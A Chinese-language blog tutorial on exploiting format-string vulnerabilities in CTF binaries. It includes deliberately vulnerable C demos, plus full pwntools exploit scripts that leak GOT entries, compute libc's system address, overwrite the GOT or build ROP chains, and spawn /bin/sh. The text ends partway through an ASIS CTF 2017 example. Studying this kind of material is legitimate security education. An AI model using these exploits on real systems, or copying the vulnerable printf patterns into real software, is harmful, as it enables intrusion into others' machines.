<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  
    
      
    

    
  

  
    
      
    

    
  

  
    
      
    

    
  

  

  
    
    
    <link href="https://fonts.loli.net/css?family=Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/x32.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/x16.ico?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="pwnable,fmtstr,">





  <link rel="alternate" href="/atom.xml" title="ditto's blog" type="application/atom+xml">






<meta name="description" content="前言：这篇笔记总结下格式化字符串漏洞的利用。看之前需要对基本格式化字符串漏洞原理有所了解，在先前的笔记中已有。格式化字符串漏洞的利用，往往就两点：泄露内存，修改内存。泄露内存可以泄露栈上数据，如 saved ebp/rbp , 返回地址，还有函数的got表项内容。修改内存可以修改got表项内容，返回地址，变量的值等等。还可以利用他来写ROP等。 预备知识： %x:   他可以将对应参数的值以16进">
<meta name="keywords" content="pwnable,fmtstr">
<meta property="og:type" content="article">
<meta property="og:title" content="格式化串漏洞利用总结">
<meta property="og:url" content="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/index.html">
<meta property="og:site_name" content="ditto&#39;s blog">
<meta property="og:description" content="前言：这篇笔记总结下格式化字符串漏洞的利用。看之前需要对基本格式化字符串漏洞原理有所了解，在先前的笔记中已有。格式化字符串漏洞的利用，往往就两点：泄露内存，修改内存。泄露内存可以泄露栈上数据，如 saved ebp/rbp , 返回地址，还有函数的got表项内容。修改内存可以修改got表项内容，返回地址，变量的值等等。还可以利用他来写ROP等。 预备知识： %x:   他可以将对应参数的值以16进">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/1.png">
<meta property="og:image" content="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/2.png">
<meta property="og:image" content="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/3.png">
<meta property="og:image" content="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/4.png">
<meta property="og:image" content="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/5.png">
<meta property="og:image" content="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/6.png">
<meta property="og:image" content="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/7.png">
<meta property="og:image" content="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/8.png">
<meta property="og:image" content="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/9.png">
<meta property="og:image" content="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/10.png">
<meta property="og:image" content="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/12.png">
<meta property="og:updated_time" content="2019-02-26T12:26:52.217Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="格式化串漏洞利用总结">
<meta name="twitter:description" content="前言：这篇笔记总结下格式化字符串漏洞的利用。看之前需要对基本格式化字符串漏洞原理有所了解，在先前的笔记中已有。格式化字符串漏洞的利用，往往就两点：泄露内存，修改内存。泄露内存可以泄露栈上数据，如 saved ebp/rbp , 返回地址，还有函数的got表项内容。修改内存可以修改got表项内容，返回地址，变量的值等等。还可以利用他来写ROP等。 预备知识： %x:   他可以将对应参数的值以16进">
<meta name="twitter:image" content="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/">





  <title>格式化串漏洞利用总结 | ditto's blog</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ditto's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            站点地图
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/22/格式化串漏洞利用总结/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ditto">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/my.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ditto's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">格式化串漏洞利用总结</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-22T19:43:00+08:00">
                2019-02-22
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  4.1k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  17
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>这篇笔记总结下格式化字符串漏洞的利用。看之前需要对基本格式化字符串漏洞原理有所了解，在先前的笔记中已有。<br>格式化字符串漏洞的利用，往往就两点：泄露内存，修改内存。泄露内存可以泄露栈上数据，如 saved ebp/rbp , 返回地址，还有函数的got表项内容。修改内存可以修改got表项内容，返回地址，变量的值等等。还可以利用他来写ROP等。</p>
<h3 id="预备知识："><a href="#预备知识：" class="headerlink" title="预备知识："></a>预备知识：</h3><ol>
<li>%x:   他可以将对应参数的值以16进制打印出来，<strong>%x只能打印4个字节，%lx或者%llx可以打8个字节</strong>。如%x表示要泄漏对应偏移4字节长度的16进制数据，%llx表示要泄漏对应偏移8字节长度的16进制数据。</li>
<li>%s：可以打印<strong>对应参数所指向的字符串</strong>。</li>
<li>%n:  可以修改对应参数（这个参数是指针）所指向的变量的值为%n之前打印的字符的个数，如果是32位程序，则这个指针变量为4字节，64位程序这个指针变量为8字节，这是因为不同位数，地址的长度不同。<strong>还要注意%n是修改对应参数指向的地址起，4字节长度的空间。，%hn，是修改2字节的地址空间，%hhn是1字节的地址空间，%lln是修改8字节的地址空间。</strong><br><strong>像修改地址这样的大数据，如果一次输出太多的字节可能会引起程序崩溃，则可以利用%hn，%hhn来一部分一部分的写入，下面修改内存部分会讲到。</strong></li>
</ol>
<h3 id="泄露内存："><a href="#泄露内存：" class="headerlink" title="泄露内存："></a>泄露内存：</h3><h4 id="泄露got表项内容："><a href="#泄露got表项内容：" class="headerlink" title="泄露got表项内容："></a>泄露got表项内容：</h4><p>   泄露内存可以泄露程序中使用过的函数的got表项的内容，得到该函数的地址。但是在64位程序中，往往会被\x00给截断。。因为64位程序中，很多地址的高位是00，但是在32位程序中不会，这就需要将地址写在格式化串的末尾。<br>   如果已知目标程序使用的libc库，就可以计算出system函数的地址，<br>   如果题目没有给出目标程序使用的libc库，则可以多泄露几个函数的地址，通过 <a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a> 来获知目标程序使用的libc库，然后再计算出system函数的地址。也可以使用这个python的库<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a> 来获知目标程序使用的动态库，原理都是一样的：ASLR不会随机化地址的后12bit。<br>具体计算方法是:<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">libc_base</span> = 泄露函数的地址 - 其在libc库中的偏移(libc.symbols[<span class="string">"函数名"</span>])</span><br><span class="line"><span class="attr">system_address</span> = libc_base + system在库中的偏移(libc.symbols[<span class="string">"system"</span>])</span><br></pre></td></tr></table></figure></p>
<p> 出现格式化串漏洞的时候，程序往往是这样的：</p>
<pre><code>char a[50];
read(0,a,50);
printf(a);
</code></pre><p>则你输入的字符串是保存在栈中的（后面会讨论格式化串不在栈中的情况，如在bss段或者堆中），然后你调用printf函数，此时printf函数的堆栈是在原先函数堆栈的低地址处，所以printf可以找到字符串的空间。<br>如图：<br><img src="/2019/02/22/格式化串漏洞利用总结/1.png" alt=""><br>例如可以得到这样的结果：<br><img src="/2019/02/22/格式化串漏洞利用总结/2.png" alt=""><br>可以看到AAAA在格式化串偏移7位置处。<br>如果将第七个%x，换成%s，那就将打印0x41414141这个地址指向的字符串了。很可能这不是一个有效的字符串地址，换成%s，会出现段错误。<br>如果将AAAA换成有效的字符串地址，则将字符串打印出来。</p>
<p>写个例子，分别讨论下32位和64位。</p>
<h5 id="32位程序："><a href="#32位程序：" class="headerlink" title="32位程序："></a>32位程序：</h5><p> 源代码如下：<br> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fsb</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">  read(<span class="number">0</span>,a,<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">  read(<span class="number">0</span>,a,<span class="number">0x500</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  fsb();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译时关闭了canary和pie保护：<br> <code>gcc -m32 demo.c -fno-stack-protector -no-pie -g -o demo</code><br> 这里的setbuf函数是关闭输出缓冲区，防止远程打的时候，没有输出。<br> 题目的思路如下：<br> 使用格式化串漏洞随便泄露一个函数的got表项内容，结合libc库，计算出libc的基地址，接着计算出system函数的地址。<br> 此时格式化串的构造方式为：<br> <code>payload=p32(函数got表项的地址)+ %offset$s</code><br> offset怎么计算，可以看看格式化串漏洞的基本原理。<br> 这样就可以将got表项的内容打印出来，计算出system函数的地址后，简单的rop，即可得到shell，完整exp如下：<br> <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">a=process(<span class="string">"./demo"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./demo"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">offset=7</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload=p32(read_got)+<span class="string">"%7$s"</span> <span class="comment">#格式化串</span></span><br><span class="line">a.send(payload)</span><br><span class="line">read_addr=u32(a.recv(8)[4:8]) <span class="comment">#接受read函数的地址</span></span><br><span class="line"></span><br><span class="line">system_addr=read_addr-libc.symbols[<span class="string">"read"</span>]+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">pop3ret = 0x8048619 </span><br><span class="line">payload='A'*112 <span class="comment">#padding</span></span><br><span class="line">payload+=p32(read_addr) <span class="comment">#read函数将/bin/sh读入bss段</span></span><br><span class="line">payload+=p32(pop3ret)</span><br><span class="line">payload+=p32(0)</span><br><span class="line">payload+=p32(elf.bss())</span><br><span class="line">payload+=p32(10)</span><br><span class="line">payload+=p32(system_addr)</span><br><span class="line">payload+=p32(pop3ret)</span><br><span class="line">payload+=p32(elf.bss())</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/02/22/格式化串漏洞利用总结/3.png" alt=""></p>
<h5 id="64位程序："><a href="#64位程序：" class="headerlink" title="64位程序："></a>64位程序：</h5><p>和32位程序的代码是一样的。编译时去掉了-m32选项。</p>
<p>64位参数的传递和32位有所不同，由于64位cpu寄存器很多，所以前6个参数通过寄存器传递，从函数名开始的第一个参数到第六个参数依次放在rdi,rsi,rdx,rcx,r8,r9，多余6个的参数，从右往左依次入栈。<br>由于64位程序的地址，很多高位是0，这样就会导致，格式化串被\x00截断,例如：<br><img src="/2019/02/22/格式化串漏洞利用总结/4.png" alt=""><br>拿read函数的got举例：<br><code>p64(read_got)=&quot;\x30\x10\x60\x00\x00\x00\x00\x00&quot;</code><br>由于字符串是以\x00结尾的，所以会被截断，但是将其放在字符串的末尾就可以解决了：<br><code>payload=&#39;A&#39;*(???) + &#39;%&#39; + str(offset+????) + &quot;$s&quot; + p64(read_got)</code><br>要注意将地址写在8字节对齐处。<br>payload前面的AAA..是为了将p64(read_got)写在8字节对齐处，至于要写多少个A，就按具体情况计算了。<br>完整的脚本如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line">a=process(<span class="string">"./demo64"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./demo64"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">offset=6</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">payload=<span class="string">"AAAA%7$s"</span>+p64(read_got)<span class="comment">#本例中是4个A</span></span><br><span class="line">a.sendline(payload)</span><br><span class="line">read_addr=u64(a.recvuntil(<span class="string">"\x30"</span>,drop=True)[4:].ljust(8,'\x00'))</span><br><span class="line">print <span class="string">"read_addr = "</span>+str(hex(read_addr))</span><br><span class="line"></span><br><span class="line">system_addr=read_addr-libc.symbols[<span class="string">"read"</span>]+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">print <span class="string">"system_addr = "</span>+str(hex(system_addr))</span><br><span class="line">pop_rdi_ret=0x400753 <span class="comment">#ROPgadget</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ret2csu </span></span><br><span class="line">payload='A'*120 <span class="comment">#padding</span></span><br><span class="line">payload+=p64(0x40074A)<span class="comment">#csu_init </span></span><br><span class="line">payload+=p64(0)<span class="comment">#rbx=0</span></span><br><span class="line">payload+=p64(1)<span class="comment">#rbp=1</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r12 </span></span><br><span class="line">payload+=p64(0)<span class="comment">#arg3 -&gt; fd</span></span><br><span class="line">payload+=p64(elf.bss())<span class="comment">#arg2 -&gt; buf</span></span><br><span class="line">payload+=p64(7)<span class="comment">#arg1 -&gt; length</span></span><br><span class="line">payload+=p64(0x400730)<span class="comment">#csu_init</span></span><br><span class="line">payload+='A'*56 <span class="comment">#padding</span></span><br><span class="line">payload+=p64(pop_rdi_ret)<span class="comment">#return address</span></span><br><span class="line">payload+=p64(elf.bss())</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/02/22/格式化串漏洞利用总结/5.png" alt=""></p>
<h3 id="修改内存："><a href="#修改内存：" class="headerlink" title="修改内存："></a>修改内存：</h3><p>   修改内存往往是修改函数的GOT表项，例如修改为system函数的地址，则调用被修改got表的函数就会调用system函数。结合下面的小例子来看一下：</p>
<pre><code>#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
int main()
{
  setbuf(stdout,0);
  while(1)
  {
    char b[100];
    gets(b);
    printf(b);
  }
  return 0;
}
</code></pre><p>   编译时关闭了canary保护和PIE保护。<br>   这个例子的利用思路就是先使用printf函数泄露某个函数的地址，然后结合libc库，计算出system函数的地址。第二次利用printf函数修改printf函数的got表项内容为system函数的地址，再输入字符串/bin/sh\x00，则再次调用printf函数时，其实会调用system(“/bin/sh”)，这样就可以拿到shell了。下面分32位程序和64位程序：</p>
<h5 id="32位程序：-1"><a href="#32位程序：-1" class="headerlink" title="32位程序："></a>32位程序：</h5><p>   32位程序不会有被地址截断的情况，则格式化串比较好写。<br>   可以用%hhn一个字节一个字节写，这样打印的字符就会很少，不至于程序崩溃，当然也可以用%hn两个字节两个字节写入。<br>   一个字节写入的模板如下：<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=p<span class="number">32</span><span class="comment">(target)</span>+p<span class="number">32</span><span class="comment">(target+1)</span>+p<span class="number">32</span><span class="comment">(target+2)</span>+p<span class="number">32</span><span class="comment">(target+3)</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length1)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset)</span>+<span class="string">"$hhn"</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length2)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset+1)</span>+<span class="string">"$hhn"</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length3)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset+2)</span>+<span class="string">"$hhn"</span></span><br><span class="line">payload+=<span class="string">'%'</span>+str<span class="comment">(length4)</span>+<span class="string">'c'</span>+<span class="string">"%"</span>+str<span class="comment">(offset+3)</span>+<span class="string">"$hhn"</span></span><br></pre></td></tr></table></figure></p>
<p>pwntools这个库有了现成的函数fmtstr_payload，可以生成修改内存的格式化串,但是这个只适用于32位的，原因是这个函数生成的payload和上面写的模板是一样的，64位的程序，地址会有00，这个payload会被截断。<br>   完整的利用脚本如下：</p>
<pre><code>#!/usr/bin/env python
from pwn import *
context.log_level=&quot;debug&quot;
a=process(&quot;./fsb&quot;)
elf=ELF(&quot;./fsb&quot;)
libc=ELF(&quot;./libc.so.6&quot;)
printf_got=elf.got[&quot;printf&quot;]
def leak(addr):
    payload=p32(addr)
    payload+=&quot;%7$s&quot;
    a.sendline(payload)
    data=a.recv(8)[4:8]
    return data

def get(target,printed):
    if printed&gt;target:
        return (256-printed+target)
    elif printed==target:
        return 0
    else: 
        return target-printed

def modify(target,offset,old):
    t1=target&amp;0xff
    t2=target&gt;&gt;8&amp;0xff
    t3=target&gt;&gt;16&amp;0xff
    t4=target&gt;&gt;24&amp;0xff

    payload=p32(old)+p32(old+1)+p32(old+2)+p32(old+3)
    len1=get(t1,len(payload))
    len2=get(t2,(len1)+16)
    len3=get(t3,(len2+len1)+16)
    len4=get(t4,(len3+len2+len1)+16)
    payload+=&apos;%&apos;+str(len1)+&apos;c&apos;+&apos;%&apos;+str(offset)+&apos;$hhn&apos;
    payload+=&apos;%&apos;+str(len2)+&apos;c&apos;+&apos;%&apos;+str(offset+1)+&apos;$hhn&apos;
    payload+=&apos;%&apos;+str(len3)+&apos;c&apos;+&apos;%&apos;+str(offset+2)+&apos;$hhn&apos;
    payload+=&apos;%&apos;+str(len4)+&apos;c&apos;+&apos;%&apos;+str(offset+3)+&apos;$hhn&apos;
    return payload

printf_addr=u32(leak(printf_got))

system_addr=printf_addr-libc.symbols[&quot;printf&quot;]+libc.symbols[&quot;system&quot;]

payload=modify(system_addr,7,printf_got)

a.sendline(payload) 
sleep(0.1)
a.sendline(&quot;/bin/sh\x00&quot;)
a.interactive()
</code></pre><p>解释下脚本：</p>
<pre><code>payload=p32(old)+p32(old+1)+p32(old+2)+p32(old+3)
</code></pre><p>这里是先将要修改的got表项的地址写入栈中，然后利用找到的偏移来一个字节一个字节的修改</p>
<pre><code>def get(target,printed):
        if printed&gt;target:
            return (0x100-printed+target)
        elif printed==target:
            return 0
        else: 
            return target-printed
</code></pre><p>get函数是用来计算要打印多少字节的。如果前面覆盖字节所需打印的字符的个数超过了后面要打印字符的个数，则可以通过溢出来调整，例如你想要写入\x00，则你可以打印0x100个字符，因为只能写入一个字节长度，所以高位字节会被截断，只留下\x00。</p>
<h5 id="64位程序：-1"><a href="#64位程序：-1" class="headerlink" title="64位程序："></a>64位程序：</h5><p>64位程序用这道题做示范：ASIS CTF 2017 Mary Morton</p>
<p>网上的writeup都是使用现成的工具formatStringExploiter来攻击的。<br>还有的writeup是通过泄露canary，利用栈溢出写rop利用的。这次通过手动利用格式化串漏洞来攻击。<br>64位程序，修改内存，就不能像上面32位那样分开一点一点写了，只能利用%lln一次写完。当然，如果目标内存，只需要修改2个字节或者4字节，就可以使用%hn，%n。<br>格式化串的模板如下：<br><code>payload=&#39;a&#39;*(???)+&#39;%&#39;+str(length)+&#39;c&#39;+&#39;%&#39;+str(offset+????)+&quot;$lln&quot;+p64(目标地址)</code><br>payload前面的 ‘a’ 是考虑到字节对齐的问题，要将目标地址写在8字节对齐处。offset要加多少，也是根据具体情况。<br>题目的main函数如下：<br><img src="/2019/02/22/格式化串漏洞利用总结/6.png" alt=""><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">fsb</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);<span class="meta">#canary</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);#格式化串漏洞</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">stackoverflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);<span class="meta">#canary</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);#栈溢出</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"-&gt; %s\n"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
